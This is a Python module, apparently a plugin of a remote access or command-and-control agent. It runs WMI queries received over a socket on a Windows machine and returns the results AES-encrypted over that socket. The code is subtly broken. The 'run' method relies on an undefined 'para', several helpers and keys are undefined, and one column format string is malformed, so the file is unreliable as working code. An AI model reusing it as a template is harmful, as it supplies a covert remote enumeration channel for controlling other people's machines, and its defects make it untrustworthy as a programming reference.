import win32com.client
import pythoncom
import base64

class WMIC:
    def __init__(self, sock) -> None:
        self.sock = sock

    def exec_query(self, q):
        pythoncom.CoInitialize()
        wmi = win32com.client.GetObject('winmgmts:')
        if not wmi:
            print('ERROR')
            return
        
        output = ''
        try:
            # EXECUTE SQL QUERY
            result = wmi.ExecQuery(q)
            result_dic = {}
            for item in result:
                properties = item.Properties_
                for prop in properties:
                    if not prop.Name in result_dic.keys() and prop.Name != 'Handle':
                        result_dic[prop.Name] = []
                    
                    if prop.Name != 'Handle':
                        result_dic[prop.Name].append(str(prop.Value))

            # MAX COLUMN WIDTH
            prop_name_list = [list(result_dic.keys())[i] for i in range(0, len(result_dic.keys()))]
            max_len_list = [len(name) for name in prop_name_list]
            for i in range(0, len(prop_name_list)):
                prop_name = prop_name_list[i]
                for j in result_dic[prop_name]:
                    if len(str(j)) > max_len_list[i]:
                        max_len_list[i] = len(str(j))

            # CONSTRUCT COLUMNS
            col = ''
            for i in range(0, len(prop_name_list)):
                col += f'%-s{max_len_list[i]}s\t' % prop_name_list[i]
            output += f'{col}\n'

            # SPLITER
            line = ''
            for i in prop_name_list:
                name_len = len(i)
                line += '-' * name_len
                for j in max_len_list:
                    line += ' ' * (j - name_len)
            output += f'{line}\n'

            # DATE
            for i in range(0, len(result_dic[prop_name_list[0]])):
                row = ''
                for j in range(0, len(prop_name_list)):
                    key = prop_name_list[j]
                    row += f'%-{max_len_list[j]}s\t' % result_dic[key][i]
                output += f'{row}\n'
            
            output = f'1|{b64EnStr(output)}'
        except Exception as e:
            #raise e
            output = f'0|{b64EnStr(str(e))}'
        
        pythoncom.CoUninitialize()
        return output

    def run(self):
        method = para[0]
        query = base64.b64decode(para[1]).decode()
        payload = ''
        if method == 'd':
            payload = self.exec_query(query)
            payload = f'WMIC|d|{payload}'
        
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))
        
if __name__ == '__main__':
    pass